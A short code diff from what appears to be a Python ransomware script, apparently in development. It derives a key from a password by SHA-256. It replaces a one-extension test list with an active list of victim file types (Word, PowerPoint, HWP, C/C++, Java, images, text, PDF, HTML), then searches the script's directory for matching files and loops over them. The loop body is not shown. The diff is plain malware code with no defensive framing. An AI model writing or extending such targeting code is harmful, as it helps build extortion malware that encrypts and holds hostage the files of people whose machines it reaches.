@@ -8,12 +8,12 @@ key = hashlib.sha256(password).digest()
 default_path = os.path.dirname(os.path.realpath(__file__))
 #default_path = "C:\\Users\\oonja\\Desktop\\Ransomware"
 
-ext_list = [".hwp"]
-''''
-ext_list = [".doc", ".hwp",".c",".cpp",
+#ext_list = [".hwp"]
+
+ext_list = [".doc", ".docx", ".hwp", ".c", ".cpp",
 ".java",".ppt", ".pptx", ".pptm", ".jpg", 
-".png", ".jpeg", ".gif", ".bmp", ".txt"]
-'''
+".png", ".jpeg", ".gif", ".bmp", ".txt",".pdf",".html"]
+
 file,directory = Search.search(default_path,ext_list)
 
 for i in file:
